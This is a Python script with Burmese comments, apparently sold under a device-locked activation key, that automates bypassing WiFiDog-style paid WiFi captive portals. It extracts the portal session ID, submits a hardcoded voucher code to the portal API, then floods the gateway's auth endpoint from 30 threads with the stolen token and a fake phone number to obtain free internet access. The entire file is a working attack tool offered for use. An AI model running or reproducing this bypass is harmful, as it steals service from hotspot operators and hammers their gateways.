import requests
import re
import urllib3
import time
import threading
import hashlib
import os
import platform
from urllib.parse import urlparse, parse_qs, urljoin

# Warning ပိတ်ခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
SECRET_SALT = "ohmygod@123"
PING_THREADS = 30
PING_INTERVAL = 0.05

def get_stable_id():
    """Device တစ်ခုအတွက် ပုံသေဖြစ်နေမည့် ID ကို ထုတ်ပေးခြင်း"""
    # Android Serial ကို အရင်ကြိုးစားယူခြင်း
    try:
        serial = os.popen("getprop ro.serialno").read().strip()
        if not serial or serial == "":
            # Serial မရရင် Hardware model နဲ့ OS build ကို ယူခြင်း
            serial = os.popen("getprop ro.build.display.id").read().strip()
    except:
        serial = "DEFAULT_NODE"

    # ID ကို Hash လုပ်ပြီး Format ချခြင်း
    fixed_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
    return f"TRB-{fixed_hash}"

def verify_activation():
    device_id = get_stable_id()
    # License ဖိုင်ကို Home directory ထဲမှာ Hidden ဖိုင်အနေနဲ့ သိမ်းမယ်
    key_file = os.path.join(os.path.expanduser("~"), ".turbo_license")
    
    print(f"DEVICE ID: {device_id}")
    
    # သိမ်းထားတဲ့ Key ရှိမရှိ စစ်ခြင်း
    if os.path.exists(key_file):
        with open(key_file, "r") as f:
            saved_key = f.read().strip()
    else:
        saved_key = None

    # မှန်ကန်ရမည့် Key ကို တွက်ချက်ခြင်း
    correct_key = hashlib.sha256(f"{device_id}{SECRET_SALT}".encode()).hexdigest()[:12].upper()

    if saved_key == correct_key:
        print("Status: Verified ✔")
        return True
    else:
        print("\nThis device is not activated.")
        print(f"Please copy and send your ID: {device_id}")
        input_key = input("Enter Activation Key: ").strip().upper()
        
        if input_key == correct_key:
            with open(key_file, "w") as f:
                f.write(input_key)
            print("Activation Successful! Restarting...")
            time.sleep(1)
            return True
        else:
            print("Invalid Key! Access Denied.")
            return False

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=0.8).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    while True:
        try:
            session.get(auth_link, timeout=0.3)
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Active)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    # Activation အရင်စစ်မယ်
    if not verify_activation():
        return

    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script Initializing...")
    
    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"[{time.strftime('%H:%M:%S')}] Internet OK. Waiting...           ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # Portal Link ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # Voucher Activation
                print(f"\n[*] Activating Session with Voucher API...")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                except: pass

                # Auth Ping
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Threads: {PING_THREADS}")
                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try:
        start_process()
    except KeyboardInterrupt:
        print("\nScript Stopped.")
        
